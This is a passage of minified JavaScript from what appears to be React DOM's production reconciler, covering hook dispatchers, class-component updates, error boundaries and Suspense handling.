xf(e,t,l,a,n){var i=E.p;E.p=i!==0&&8>i?i:8;var u=g.T,s={};g.T=s,rc(e,!1,t,l);try{var o=n(),y=g.S;if(y!==null&&y(s,o),o!==null&&typeof o=="object"&&typeof o.then=="function"){var S=nm(o,a);tn(e,t,S,gt(e))}else tn(e,t,a,gt(e))}catch(T){tn(e,t,{then:function(){},status:"rejected",reason:T},gt())}finally{E.p=i,u!==null&&s.types!==null&&(u.types=s.types),g.T=u}}function fm(){}function oc(e,t,l,a){if(e.tag!==5)throw Error(h(476));var n=Tf(e).queue;xf(e,n,t,Y,l===null?fm:function(){return Af(e),l(a)})}function Tf(e){var t=e.memoizedState;if(t!==null)return t;t={memoizedState:Y,baseState:Y,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Qt,lastRenderedState:Y},next:null};var l={};return t.next={memoizedState:l,baseState:l,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Qt,lastRenderedState:l},next:null},e.memoizedState=t,e=e.alternate,e!==null&&(e.memoizedState=t),t}function Af(e){var t=Tf(e);t.next===null&&(t=e.alternate.memoizedState),tn(e,t.next.queue,{},gt())}function fc(){return Ze(Sn)}function Nf(){return De().memoizedState}function jf(){return De().memoizedState}function rm(e){for(var t=e.return;t!==null;){switch(t.tag){case 24:case 3:var l=gt();e=sl(l);var a=ol(t,e,l);a!==null&&(ut(a,t,l),Fa(a,t,l)),t={cache:Lu()},e.payload=t;return}t=t.return}}function dm(e,t,l){var a=gt();l={lane:a,revertLane:0,gesture:null,action:l,hasEagerState:!1,eagerState:null,next:null},ri(e)?zf(t,l):(l=Cu(e,t,l,a),l!==null&&(ut(l,e,a),Cf(l,t,a)))}function Ef(e,t,l){var a=gt();tn(e,t,l,a)}function tn(e,t,l,a){var n={lane:a,revertLane:0,gesture:null,action:l,hasEagerState:!1,eagerState:null,next:null};if(ri(e))zf(t,n);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=t.lastRenderedReducer,i!==null))try{var u=t.lastRenderedState,s=i(u,l);if(n.hasEagerState=!0,n.eagerState=s,rt(s,u))return Vn(e,t,n,0),xe===null&&Qn(),!1}catch{}if(l=Cu(e,t,n,a),l!==null)return ut(l,e,a),Cf(l,t,a),!0}return!1}function rc(e,t,l,a){if(a={lane:2,revertLane:Xc(),gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null},ri(e)){if(t)throw Error(h(479))}else t=Cu(e,l,a,2),t!==null&&ut(t,e,2)}function ri(e){var t=e.alternate;return e===P||t!==null&&t===P}function zf(e,t){ma=ni=!0;var l=e.pending;l===null?t.next=t:(t.next=l.next,l.next=t),e.pending=t}function Cf(e,t,l){if((l&4194048)!==0){var a=t.lanes;a&=e.pendingLanes,l|=a,t.lanes=l,Ms(e,l)}}var ln={readContext:Ze,use:ci,useCallback:Ce,useContext:Ce,useEffect:Ce,useImperativeHandle:Ce,useLayoutEffect:Ce,useInsertionEffect:Ce,useMemo:Ce,useReducer:Ce,useRef:Ce,useState:Ce,useDebugValue:Ce,useDeferredValue:Ce,useTransition:Ce,useSyncExternalStore:Ce,useId:Ce,useHostTransitionStatus:Ce,useFormState:Ce,useActionState:Ce,useOptimistic:Ce,useMemoCache:Ce,useCacheRefresh:Ce};ln.useEffectEvent=Ce;var Of={readContext:Ze,use:ci,useCallback:function(e,t){return Ie().memoizedState=[e,t===void 0?null:t],e},useContext:Ze,useEffect:df,useImperativeHandle:function(e,t,l){l=l!=null?l.concat([e]):null,oi(4194308,4,pf.bind(null,t,e),l)},useLayoutEffect:function(e,t){return oi(4194308,4,e,t)},useInsertionEffect:function(e,t){oi(4,2,e,t)},useMemo:function(e,t){var l=Ie();t=t===void 0?null:t;var a=e();if(ql){el(!0);try{e()}finally{el(!1)}}return l.memoizedState=[a,t],a},useReducer:function(e,t,l){var a=Ie();if(l!==void 0){var n=l(t);if(ql){el(!0);try{l(t)}finally{el(!1)}}}else n=t;return a.memoizedState=a.baseState=n,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},a.queue=e,e=e.dispatch=dm.bind(null,P,e),[a.memoizedState,e]},useRef:function(e){var t=Ie();return e={current:e},t.memoizedState=e},useState:function(e){e=nc(e);var t=e.queue,l=Ef.bind(null,P,t);return t.dispatch=l,[e.memoizedState,l]},useDebugValue:cc,useDeferredValue:function(e,t){var l=Ie();return sc(l,e,t)},useTransition:function(){var e=nc(!1);return e=xf.bind(null,P,e.queue,!0,!1),Ie().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,t,l){var a=P,n=Ie();if(se){if(l===void 0)throw Error(h(407));l=l()}else{if(l=t(),xe===null)throw Error(h(349));(ie&127)!==0||Wo(a,t,l)}n.memoizedState=l;var i={value:l,getSnapshot:t};return n.queue=i,df($o.bind(null,a,i,e),[e]),a.flags|=2048,pa(9,{destroy:void 0},Fo.bind(null,a,i,l,t),null),l},useId:function(){var e=Ie(),t=xe.identifierPrefix;if(se){var l=Ht,a=Dt;l=(a&~(1<<32-ft(a)-1)).toString(32)+l,t="_"+t+"R_"+l,l=ii++,0<l&&(t+="H"+l.toString(32)),t+="_"}else l=im++,t="_"+t+"r_"+l.toString(32)+"_";return e.memoizedState=t},useHostTransitionStatus:fc,useFormState:cf,useActionState:cf,useOptimistic:function(e){var t=Ie();t.memoizedState=t.baseState=e;var l={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return t.queue=l,t=rc.bind(null,P,!0,l),l.dispatch=t,[e,t]},useMemoCache:tc,useCacheRefresh:function(){return Ie().memoizedState=rm.bind(null,P)},useEffectEvent:function(e){var t=Ie(),l={impl:e};return t.memoizedState=l,function(){if((re&2)!==0)throw Error(h(440));return l.impl.apply(void 0,arguments)}}},dc={readContext:Ze,use:ci,useCallback:vf,useContext:Ze,useEffect:uc,useImperativeHandle:gf,useInsertionEffect:mf,useLayoutEffect:yf,useMemo:Sf,useReducer:si,useRef:rf,useState:function(){return si(Qt)},useDebugValue:cc,useDeferredValue:function(e,t){var l=De();return bf(l,ve.memoizedState,e,t)},useTransition:function(){var e=si(Qt)[0],t=De().memoizedState;return[typeof e=="boolean"?e:en(e),t]},useSyncExternalStore:Jo,useId:Nf,useHostTransitionStatus:fc,useFormState:sf,useActionState:sf,useOptimistic:function(e,t){var l=De();return ef(l,ve,e,t)},useMemoCache:tc,useCacheRefresh:jf};dc.useEffectEvent=hf;var _f={readContext:Ze,use:ci,useCallback:vf,useContext:Ze,useEffect:uc,useImperativeHandle:gf,useInsertionEffect:mf,useLayoutEffect:yf,useMemo:Sf,useReducer:ac,useRef:rf,useState:function(){return ac(Qt)},useDebugValue:cc,useDeferredValue:function(e,t){var l=De();return ve===null?sc(l,e,t):bf(l,ve.memoizedState,e,t)},useTransition:function(){var e=ac(Qt)[0],t=De().memoizedState;return[typeof e=="boolean"?e:en(e),t]},useSyncExternalStore:Jo,useId:Nf,useHostTransitionStatus:fc,useFormState:ff,useActionState:ff,useOptimistic:function(e,t){var l=De();return ve!==null?ef(l,ve,e,t):(l.baseState=e,[e,l.queue.dispatch])},useMemoCache:tc,useCacheRefresh:jf};_f.useEffectEvent=hf;function hc(e,t,l,a){t=e.memoizedState,l=l(a,t),l=l==null?t:q({},t,l),e.memoizedState=l,e.lanes===0&&(e.updateQueue.baseState=l)}var mc={enqueueSetState:function(e,t,l){e=e._reactInternals;var a=gt(),n=sl(a);n.payload=t,l!=null&&(n.callback=l),t=ol(e,n,a),t!==null&&(ut(t,e,a),Fa(t,e,a))},enqueueReplaceState:function(e,t,l){e=e._reactInternals;var a=gt(),n=sl(a);n.tag=1,n.payload=t,l!=null&&(n.callback=l),t=ol(e,n,a),t!==null&&(ut(t,e,a),Fa(t,e,a))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var l=gt(),a=sl(l);a.tag=2,t!=null&&(a.callback=t),t=ol(e,a,l),t!==null&&(ut(t,e,l),Fa(t,e,l))}};function Mf(e,t,l,a,n,i,u){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(a,i,u):t.prototype&&t.prototype.isPureReactComponent?!Ga(l,a)||!Ga(n,i):!0}function Df(e,t,l,a){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(l,a),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(l,a),t.state!==e&&mc.enqueueReplaceState(t,t.state,null)}function Gl(e,t){var l=t;if("ref"in t){l={};for(var a in t)a!=="ref"&&(l[a]=t[a])}if(e=e.defaultProps){l===t&&(l=q({},l));for(var n in e)l[n]===void 0&&(l[n]=e[n])}return l}function Hf(e){Xn(e)}function wf(e){console.error(e)}function Uf(e){Xn(e)}function di(e,t){try{var l=e.onUncaughtError;l(t.value,{componentStack:t.stack})}catch(a){setTimeout(function(){throw a})}}function Rf(e,t,l){try{var a=e.onCaughtError;a(l.value,{componentStack:l.stack,errorBoundary:t.tag===1?t.stateNode:null})}catch(n){setTimeout(function(){throw n})}}function yc(e,t,l){return l=sl(l),l.tag=3,l.payload={element:null},l.callback=function(){di(e,t)},l}function kf(e){return e=sl(e),e.tag=3,e}function Bf(e,t,l,a){var n=l.type.getDerivedStateFromError;if(typeof n=="function"){var i=a.value;e.payload=function(){return n(i)},e.callback=function(){Rf(t,l,a)}}var u=l.stateNode;u!==null&&typeof u.componentDidCatch=="function"&&(e.callback=function(){Rf(t,l,a),typeof n!="function"&&(yl===null?yl=new Set([this]):yl.add(this));var s=a.stack;this.componentDidCatch(a.value,{componentStack:s!==null?s:""})})}function hm(e,t,l,a,n){if(l.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){if(t=l.alternate,t!==null&&sa(t,l,n,!0),l=ht.current,l!==null){switch(l.tag){case 31:case 13:return jt===null?Ni():l.alternate===null&&Oe===0&&(Oe=3),l.flags&=-257,l.flags|=65536,l.lanes=n,a===Pn?l.flags|=16384:(t=l.updateQueue,t===null?l.updateQueue=new Set([a]):t.add(a),Yc(e,a,n)),!1;case 22:return l.flags|=65536,a===Pn?l.flags|=16384:(t=l.updateQueue,t===null?(t={transitions:null,markerInstances:null,retryQueue:new Set([a])},l.updateQueue=t):(l=t.retryQueue,l===null?t.retryQueue=new Set([a]):l.add(a)),Yc(e,a,n)),!1}throw Error(h(435,l.tag))}return Yc(e,a,n),Ni(),!1}if(se)return t=ht.current,t!==null?((t.flags&65536)===0&&(t.flags|=256),t.flags|=65536,t.lanes=n,a!==wu&&(e=Error(h(422),{cause:a}),Va(xt(e,l)))):(a!==wu&&(t=Error(h(423),{cause:a}),Va(xt(t,l))),e=e.current.alternate,e.flags|=65536,n&=-n,e.lanes|=n,a=xt(a,l),n=yc(e.stateNode,a,n),Vu(e,n),Oe!==4&&(Oe=2)),!1;var i=Error(h(520),{cause:a});if(i=xt(i,l),rn===null?rn=[i]:rn.push(i),Oe!==4&&(Oe=2),t===null)return!0;a=xt(a,l),l=t;do{switch(l.tag){case 3:return l.flags|=65536,e=n&-n,l.lanes|=e,e=yc(l.stateNode,a,e),Vu(l,e),!1;case 1:if(t=l.type,i=l.stateNode,(l.flags&128)===0&&(typeof t.getDerivedStateFromError=="function"||i!==null&&typeof i.componentDidCatch=="function"&&(yl===null||!yl.has(i))))return l.flags|=65536,n&=-n,l.lanes|=n,n=kf(n),Bf(n,e,l,a),Vu(l,n),!1}l=l.return}while(l!==null);return!1}var pc=Error(h(461)),Ue=!1;function Ke(e,t,l,a){t.child=e===null?qo(t,null,l,a):Yl(t,e.child,l,a)}function Lf(e,t,l,a,n){l=l.render;var i=t.ref;if("ref"in a){var u={};for(var s in a)s!=="ref"&&(u[s]=a[s])}else u=a;return Rl(t),a=$u(e,t,l,u,i,n),s=Iu(),e!==null&&!Ue?(Pu(e,t,n),Vt(e,t,n)):(se&&s&&Du(t),t.flags|=1,Ke(e,t,a,n),t.child)}function Yf(e,t,l,a,n){if(e===null){var i=l.type;return typeof i=="function"&&!Ou(i)&&i.defaultProps===void 0&&l.compare===null?(t.tag=15,t.type=i,qf(e,t,i,a,n)):(e=Kn(l.type,null,a,t,t.mode,n),e.ref=t.ref,e.return=t,t.child=e)}if(i=e.child,!Nc(e,n)){var u=i.memoizedProps;if(l=l.compare,l=l!==null?l:Ga,l(u,a)&&e.ref===t.ref)return Vt(e,t,n)}return t.flags|=1,e=Lt(i,a),e.ref=t.ref,e.return=t,t.child=e}function qf(e,t,l,a,n){if(e!==null){var i=e.memoizedProps;if(Ga(i,a)&&e.ref===t.ref)if(Ue=!1,t.pendingProps=a=i,Nc(e,n))(e.flags&131072)!==0&&(Ue=!0);else return t.lanes=e.lanes,Vt(e,t,n)}return gc(e,t,l,a,n)}function Gf(e,t,l,a){var n=a.children,i=e!==null?e.memoizedState:null;if(e===null&&t.stateNode===null&&(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),a.mode==="hidden"){if((t.flags&128)!==0){if(i=i!==null?i.baseLanes|l:l,e!==null){for(a=t.child=e.child,n=0;a!==null;)n=n|a.lanes|a.childLanes,a=a.sibling;a=n&~i}else a=0,t.child=null;return Xf(e,t,i,l,a)}if((l&536870912)!==0)t.memoizedState={baseLanes:0,cachePool:null},e!==null&&$n(t,i!==null?i.cachePool:null),i!==null?Qo(t,i):Ku(),Vo(t);else return a=t.lanes=536870912,Xf(e,t,i!==null?i.baseLanes|l:l,l,a)}else i!==null?($n(t,i.cachePool),Qo(t,i),rl(),t.memoizedState=null):(e!==null&&$n(t,null),Ku(),rl());return Ke(e,t,n,l),t.child}function an(e,t){return e!==null&&e.tag===22||t.stateNode!==null||(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),t.sibling}function Xf(e,t,l,a,n){var i=qu();return i=i===null?null:{parent:He._currentValue,pool:i},t.memoizedState={baseLanes:l,cachePool:i},e!==null&&$n(t,null),Ku(),Vo(t),e!==null&&sa(e,t,a,!0),t.childLanes=n,null}function hi(e,t){return t=yi({mode:t.mode,children:t.children},e.mode),t.ref=e.ref,e.child=t,t.return=e,t}function Qf(e,t,l){return Yl(t,e.child,null,l),e=hi(t,t.pendingProps),e.flags|=2,mt(t),t.memoizedState=null,e}function mm(e,t,l){var a=t.pendingProps,n=(t.flags&128)!==0;if(t.flags&=-129,e===null){if(se){if(a.mode==="hidden")return e=hi(t,a),t.lanes=536870912,an(null,e);if(Wu(t),(e=je)?(e=ld(e,Nt),e=e!==null&&e.data==="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:al!==null?{id:Dt,overflow:Ht}:null,retryLane:536870912,hydrationErrors:null},l=Eo(e),l.return=t,t.child=l,Ve=t,je=null)):e=null,e===null)throw il(t);return t.lanes=536870912,null}return hi(t,a)}var i=e.memoizedState;if(i!==null){var u=i.dehydrated;if(Wu(t),n)if(t.flags&256)t.flags&=-257,t=Qf(e,t,l);else if(t.memoizedState!==null)t.child=e.child,t.flags|=128,t=null;else throw Error(h(558));else if(Ue||sa(e,t,l,!1),n=(l&e.childLanes)!==0,Ue||n){if(a=xe,a!==null&&(u=Ds(a,l),u!==0&&u!==i.retryLane))throw i.retryLane=u,Dl(e,u),ut(a,e,u),pc;Ni(),t=Qf(e,t,l)}else e=i.treeContext,je=Et(u.nextSibling),Ve=t,se=!0,nl=null,Nt=!1,e!==null&&Oo(t,e),t=hi(t,a),t.flags|=4096;return t}return e=Lt(e.child,{mode:a.mode,children:a.children}),e.ref=t.ref,t.child=e,e.return=t,e}function mi(e,t){var l=t.ref;if(l===null)e!==null&&e.ref!==null&&(t.flags|=4194816);else{if(typeof l!="function"&&typeof l!="object")throw Error(h(284));(e===null||e.ref!==l)&&(t.flags|=4194816)}}function gc(e,t,l,a,n){return Rl(t),l=$u(e,t,l,a,void 0,n),a=Iu(),e!==null&&!Ue?(Pu(e,t,n),Vt(e,t,n)):(se&&a&&Du(t),t.flags|=1,Ke(e,t,l,n),t.child)}function Vf(e,t,l,a,n,i){return Rl(t),t.updateQueue=null,l=Ko(t,a,l,n),Zo(e),a=Iu(),e!==null&&!Ue?(Pu(e,t,i),Vt(e,t,i)):(se&&a&&Du(t),t.flags|=1,Ke(e,t,l,i),t.child)}function Zf(e,t,l,a,n){if(Rl(t),t.stateNode===null){var i=na,u=l.contextType;typeof u=="object"&&u!==null&&(i=Ze(u)),i=new l(a,i),t.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,i.updater=mc,t.stateNode=i,i._reactInternals=t,i=t.stateNode,i.props=a,i.state=t.memoizedState,i.refs={},Xu(t),u=l.contextType,i.context=typeof u=="object"&&u!==null?Ze(u):na,i.state=t.memoizedState,u=l.getDerivedStateFromProps,typeof u=="function"&&(hc(t,l,u,a),i.state=t.memoizedState),typeof l.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(u=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),u!==i.state&&mc.enqueueReplaceState(i,i.state,null),Ia(t,a,i,n),$a(),i.state=t.memoizedState),typeof i.componentDidMount=="function"&&(t.flags|=4194308),a=!0}else if(e===null){i=t.stateNode;var s=t.memoizedProps,o=Gl(l,s);i.props=o;var y=i.context,S=l.contextType;u=na,typeof S=="object"&&S!==null&&(u=Ze(S));var T=l.getDerivedStateFromProps;S=typeof T=="function"||typeof i.getSnapshotBeforeUpdate=="function",s=t.pendingProps!==s,S||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(s||y!==u)&&Df(t,i,a,u),cl=!1;var p=t.memoizedState;i.state=p,Ia(t,a,i,n),$a(),y=t.memoizedState,s||p!==y||cl?(typeof T=="function"&&(hc(t,l,T,a),y=t.memoizedState),(o=cl||Mf(t,l,o,a,p,y,u))?(S||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount()),typeof i.componentDidMount=="function"&&(t.flags|=4194308)):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=a,t.memoizedState=y),i.props=a,i.state=y,i.context=u,a=o):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),a=!1)}else{i=t.stateNode,Qu(e,t),u=t.memoizedProps,S=Gl(l,u),i.props=S,T=t.pendingProps,p=i.context,y=l.contextType,o=na,typeof y=="object"&&y!==null&&(o=Ze(y)),s=l.getDerivedStateFromProps,(y=typeof s=="function"||typeof i.getSnapshotBeforeUpdate=="function")||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(u!==T||p!==o)&&Df(t,i,a,o),cl=!1,p=t.memoizedState,i.state=p,Ia(t,a,i,n),$a();var v=t.memoizedState;u!==T||p!==v||cl||e!==null&&e.dependencies!==null&&Wn(e.dependencies)?(typeof s=="function"&&(hc(t,l,s,a),v=t.memoizedState),(S=cl||Mf(t,l,S,a,p,v,o)||e!==null&&e.dependencies!==null&&Wn(e.dependencies))?(y||typeof i.UNSAFE_componentWillUpdate!="function"&&typeof i.componentWillUpdate!="function"||(typeof i.componentWillUpdate=="function"&&i.componentWillUpdate(a,v,o),typeof i.UNSAFE_componentWillUpdate=="function"&&i.UNSAFE_componentWillUpdate(a,v,o)),typeof i.componentDidUpdate=="function"&&(t.flags|=4),typeof i.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof i.componentDidUpdate!="function"||u===e.memoizedProps&&p===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||u===e.memoizedProps&&p===e.memoizedState||(t.flags|=1024),t.memoizedProps=a,t.memoizedState=v),i.props=a,i.state=v,i.context=o,a=S):(typeof i.componentDidUpdate!="function"||u===e.memoizedProps&&p===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||u===e.memoizedProps&&p===e.memoizedState||(t.flags|=1024),a=!1)}return i=a,mi(e,t),a=(t.flags&128)!==0,i||a?(i=t.stateNode,l=a&&typeof l.getDerivedStateFromError!="function"?null:i.render(),t.flags|=1,e!==null&&a?(t.child=Yl(t,e.child,null,n),t.child=Yl(t,null,l,n)):Ke(e,t,l,n),t.memoizedState=i.state,e=t.child):e=Vt(e,t,n),e}function Kf(e,t,l,a){return wl(),t.flags|=256,Ke(e,t,l,a),t.child}var vc={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function Sc(e){return{baseLanes:e,cachePool:Uo()}}function bc(e,t,l){return e=e!==null?e.childLanes&~l:0,t&&(e|=pt),e}function Jf(e,t,l){var a=t.pendingProps,n=!1,i=(t.flags&128)!==0,u;if((u=i)||(u=e!==null&&e.memoizedState===null?!1:(Me.current&2)!==0),u&&(n=!0,t.flags&=-129),u=(t.flags&32)!==0,t.flags&=-33,e===null){if(se){if(n?fl(t):rl(),(e=je)?(e=ld(e,Nt),e=e!==null&&e.data!=="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:al!==null?{id:Dt,overflow:Ht}:null,retryLane:536870912,hydrationErrors:null},l=Eo(e),l.return=t,t.child=l,Ve=t,je=null)):e=null,e===null)throw il(t);return ls(e)?t.lanes=32:t.lanes=536870912,null}var s=a.children;return a=a.fallback,n?(rl(),n=t.mode,s=yi({mode:"hidden",children:s},n),a=Hl(a,n,l,null),s.return=t,a.return=t,s.sibling=a,t.child=s,a=t.child,a.memoizedState=Sc(l),a.childLanes=bc(e,u,l),t.memoizedState=vc,an(null,a)):(fl(t),xc(t,s))}var o=e.memoizedState;if(o!==null&&(s=o.dehydrated,s!==null)){if(i)t.flags&256?(fl(t),t.flags&=-257,t=Tc(e,t,l)):t.memoizedState!==null?(rl(),t.child=e.child,t.flags|=128,t=null):(rl(),s=a.fallback,n=t.mode,a=yi({mode:"visible",children:a.children},n),s=Hl(s,n,l,null),s.flags|=2,a.return=t,s.return=t,a.sibling=s,t.child=a,Yl(t,e.child,null,l),a=t.child,a.memoizedState=Sc(l),a.childLanes=bc(e,u,l),t.memoizedState=vc,t=an(null,a));else if(fl(t),ls(s)){if(u=s.nextSibling&&s.nextSibling.dataset,u)var y=u.dgst;u=y,a=Error(h(419)),a.stack="",a.digest=u,Va({value:a,source:null,stack:null}),t=Tc(e,t,l)}else if(Ue||sa(e,t,l,!1),u=(l&e.childLanes)!==0,Ue||u){if(u=xe,u!==null&&(a=Ds(u,l),a!==0&&a!==o.retryLane))throw o.retryLane=a,Dl(e,a),ut(u,e,a),pc;ts(s)||Ni(),t=Tc(e,t,l)}else ts(s)?(t.flags|=192,t.child=e.child,t=null):(e=o.treeContext,je=Et(s.nextSibling),Ve=t,se=!0,nl=null,Nt=!1,e!==null&&Oo(t,e),t=xc(t,a.children),t.flags|=4096);return t}return n?(rl(),s=a.fallback,n=t.mode,o=e.child,y=o.sibling,a=Lt(o,{mode:"hidden",children:a.children}),a.subtreeFlags=o.subtreeFlags&65011712,y!==null?s=Lt(y,s):(s=Hl(s,n,l,null),s.flags|=2),s.return=t,a.return=t,a.sibling=s,t.child=a,an(null,a),a=t.child,s=e.child.memoizedState,s===null?s=Sc(l):(n=s.cachePool,n!==null?(o=He._currentValue,n=n.parent!==o?{parent:o,pool:o}:n):n=Uo(),s={baseLanes:s.baseLanes|l,cachePool:n}),a.memoizedState=s,a.childLanes=bc(e,u,l),t.memoizedState=vc,an(e.child,a)):(fl(t),l=e.child,e=l.sibling,l=Lt(l,{mode:"visible",children:a.children}),l.return=t,l.sibling=null,e!==null&&(u=t.deletions,u===null?(t.deletions=[e],t.flags|=16):u.push(e)),t.child=l,t.memoizedState=null,l)}function xc(e,t){return t=yi({mode:"visible",children:t},e.mode),t.return=e,e.child=t}function yi(e,t){return e=dt(22,e,null,t),e.lanes=0,e}function Tc(e,t,l){return Yl(t,e.child,null,l),e=xc(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function Wf(e,t,l){e.lanes|=t;var a=e.alternate;a!==null&&(a.lanes|=t),ku(e.return,t,l)}function Ac(e,t,l,a,n,i){var u=e.memoizedState;u===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:a,tail:l,tailMode:n,treeForkCount:i}:(u.isBackwards=t,u.rendering=null,u.renderingStartTime=0,u.last=a,u.tail=l,u.tailMode=n,u.treeForkCount=i)}function Ff(e,t,l){var a=t.pendingProps,n=a.revealOrder,i=a.tail;a=a.children;var u=Me.current,s=(u&2)!==0;if(s?(u=u&1|2,t.flags|=128):u&=1,z(Me,u),Ke(e,t,a,l),a=se?Qa:0,!s&&e!==null&&(e.flags&128)!==0)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Wf(e,l,t);else if(e.tag===19)Wf(e,l,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}switch(n){case"forwards":for(l=t.child,n=null;l!==null;)e=l.alternate,e!==null&&ai(e)===null&&(n=l),l=l.sibling;l=n,l===null?(n=t.child,t.child=null):(n=l.sibling,l.sibling=null),Ac(t,!1,n,l,i,a);break;case"backwards":case"unstable_legacy-backwards":for(l=null,n=t.child,t.child=null;n!==null;){if(e=n.alternate,e!==null&&ai(e)===null){t.child=n;break}e=n.sibling,n.sibling=l,l=n,n=e}Ac(t,!0,l,null,i,a);break;case"together":Ac(t,!1,null,null,void 0,a);break;default:t.memoizedState=null}return t.child}function Vt(e,t,l){if(e!==null&&(t.dependencies=e.dependencies),ml|=t.lanes,(l&t.childLanes)===0)if(e!==null){if(sa(e,t,l,!1),(l&t.childLanes)===0)return null}else return null;if(e!==null&&t.child!==e.child)throw Error(h(153));if(t.child!==null){for(e=t.child,l=Lt(e,e.pendingProps),t.child=l,l.return=t;e.sibling!==null;)e=e.sibling,l=l.sibling=Lt(e,e.pendingProps),l.return=t;l.sibling=null}return t.child}function Nc(e,t){return(e.lanes&t)!==0?!0:(e=e.dependencies,!!(e!==null&&Wn(e)))}function ym(e,t,l){switch(t.tag){case 3:Le(t,t.stateNode.containerInfo),ul(t,He,e.memoizedState.cache),wl();break;case 27:case 5:Oa(t);break;case 4:Le(t,t.stateNode.containerInfo);break;case 10:ul(t,t.type,t.memoizedProps.value);break;case 31:if(t.memoizedState!==null)return t.flags|=128,Wu(t),null;break;case 13:var a=t.memoizedState;if(a!==null)return a.dehydrated!==null?(fl(t),t.flags|=128,null):(l&t.child.childLanes)!==0?Jf(e,t,l):(fl(t),e=Vt(e,t,l),e!==null?e.sibling:null);fl(t);break;case 19:var n=(e.flags&128)!==0;if(a=(l&t.childLanes)!==0,a||(sa(e,t,l,!1),a=(l&t.childLanes)!==0),n){if(a)return Ff(e,t,l);t.flags|=128}if(n=t.memoizedState,n!==null&&(n.rendering=null,n.tail=null,n.lastEffect=null),z(Me,Me.current),a)break;return null;case 22:return t.lanes=0,Gf(e,t,l,t.pendingProps);case 24:ul(t,He,e.memoizedState.cache)}return Vt(e,t,l)}function $f(e,t,l){if(e!==null)if(e.memoizedProps!==t.pendingProps)Ue=!0;else{if(!Nc(e,l)&&(t.flags&128)===0)return Ue=!1,ym(e,t,l);Ue=(e.flags&131072)!==0}else Ue=!1,se&&(t.flags&1048576)!==0&&Co(t,Qa,t.index);switch(t.lanes=0,t.tag){case 16:e:{var a=t.pendingProps;if(e=Bl(t.elementType),t.type=e,typeof e=="function")Ou(e)?(a=Gl(e,a),t.tag=1,t=Zf(null,t,e,a,l)):(t.tag=0,t=gc(null,t,e,a,l));else{if(e!=null){var n=e.$$typeof;if(n===Ge){t.tag=11,t=Lf(null,t,e,a,l);break e}else if(n===O){t.tag=14,t=Yf(null,t,e,a,l);break e}}throw t=Z(e)||e,Error(h(306,t,""))}}return t;case 0:return gc(e,t,t.type,t.pendingProps,l);case 1:return a=t.type,n=Gl(a,t.pendingProps),Zf(e,t,a,n,l);case 3:e:{if(Le(t,t.stateNode.containerInfo),e===null)throw Error(h(387));a=t.pendingProps;var i=t.memoizedState;n=i.element,Qu(e,t),Ia(t,a,null,l);var u=t.memoizedState;if(a=u.cache,ul(t,He,a),a!==i.cache&&Bu(t,[He],l,!0),$a(),a=u.element,i.isDehydrated)if(i={element:a,isDehydrated:!1,cache:u.cache},t.updateQueue.baseState=i,t.memoizedState=i,t.flags&256){t=Kf(e,t,a,l);break e}else if(a!==n){n=xt(Error(h(424)),t),Va(n),t=Kf(e,t,a,l);break e}else for(e=t.stateNode.containerInfo,e.nodeType===9?e=e.body:e=e.nodeName==="HTML"?e.ownerDocument.body:e,je=Et(e.firstChild),Ve=t,se=!0,nl=null,Nt=!0,l=qo(t,null,a,l),t.child=l;l;)l.flags=l.flags&-3|4096,l=l.sibling;else{if(wl(),a===n){t=Vt(e,t,l);break e}Ke(e,t,a,l)}t=t.child}return t;case 26:return mi(e,t),e===null?(l=sd(t.type,null,t.pendingProps,null))?t.memoizedState=l:se||(l=t.type,e=t.pendingProps,a=Mi(Q.current).createElement(l),a[Qe]=t,a[et]=e,Je(a,l,e),Ye(a),t.stateNode=a):t.memoizedState=sd(t.type,e.memoizedProps,t.pendingProps,e.memoizedState),null;case 27:return Oa(t),e===null&&se&&(a=t.stateNode=id(t.type,t.pendingProps,Q.current),Ve=t,Nt=!0,n=je,Sl(t.type)?(as=n,je=Et(a.firstChild)):je=n),Ke(e,t,t.pendingProps.children,l),mi(e,t),e===null&&(t.flags|=4194304),t.child;case 5:return 